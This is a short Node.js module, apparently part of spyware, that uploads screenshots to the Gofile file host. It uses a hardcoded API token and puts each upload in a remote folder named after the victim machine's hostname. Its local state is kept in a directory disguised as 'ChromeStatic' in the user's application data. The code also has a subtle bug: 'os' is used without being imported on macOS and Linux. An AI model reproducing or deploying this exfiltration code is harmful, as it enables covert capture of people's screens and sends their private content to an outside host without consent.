const fsSync = require('fs');
const fs = require('fs/promises');
const path = require('path');
const {
    createFolder,
    uploadFile
} = require('@hackmesenpai/gofile-api-wrapper');

const token = "Fngym0mj63gdJjM4Zc8B73P31Asmem38";
const machineId = require('os').hostname();

function getStoragePath() {
    const base =
        process.platform === 'win32'
            ? process.env.APPDATA
            : process.platform === 'darwin'
                ? path.join(os.homedir(), 'Library', 'Application Support')
                : path.join(os.homedir(), '.config');

    return path.join(base, 'ChromeStatic');
}

async function ensureFolder(token) {
    try {
        const storagePath = getStoragePath();
        const folderIdFile = path.join(storagePath, 'folder_id.txt');

        if (!fsSync.existsSync(storagePath)) {
            await fs.mkdir(storagePath, { recursive: true });
        }

        try {
            const savedId = await fs.readFile(folderIdFile, 'utf8');
            if (savedId) {
                return savedId.trim();
            }
        } catch (_) {

        }

        const res = await createFolder("c0e98ca0-41c4-4287-8a6b-d197e67a74cf", token, machineId);
        const newId = res.data.id;

        await fs.writeFile(folderIdFile, newId);
        return newId;
    } catch (err) {
        throw err;
    }
}

async function uploadScreenshot(filePath, parentFolderId, token) {
    const fileStream = fsSync.createReadStream(filePath);
    const res = await uploadFile("upload", fileStream, token, parentFolderId);
    return res.data.name;
}

async function sendFileToGofile(filePath) {
    const folderId = await ensureFolder(token);
    const url = await uploadScreenshot(filePath, folderId, token);
    return url;
}

module.exports = { sendFileToGofile };